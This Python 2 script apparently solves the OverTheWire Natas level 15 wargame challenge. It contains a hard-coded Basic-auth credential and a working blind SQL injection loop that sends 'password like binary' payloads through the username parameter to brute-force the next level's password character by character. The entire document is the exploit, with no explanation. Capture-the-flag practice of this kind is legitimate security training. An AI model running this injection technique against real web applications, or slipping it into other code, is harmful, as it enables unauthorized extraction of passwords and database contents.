import urllib2
import time
import sys

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
headers={'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='}
request = urllib2.Request('http://natas15.natas.labs.overthewire.org', headers=headers)
response = urllib2.urlopen(request)
response.close()

found = '' if len(sys.argv) == 1 else sys.argv[1]
for i in range(len(found), 32):
    for j in range(len(chars)):
        attempt = found + chars[j]
        query = "natas16%22%20and%20password%20like%20binary%20%22" + attempt + "%25%22%20%23"
        url = "http://natas15.natas.labs.overthewire.org/?debug&username=" + query
        request = urllib2.Request(url, headers=headers)
        response = urllib2.urlopen(request)
        result = response.read()
        if 'This user exists' in result:
            found = attempt
            break
        response.close()
        time.sleep(0.2)
        sys.stdout.write('.')
        sys.stdout.flush()
    print('\n' + found)
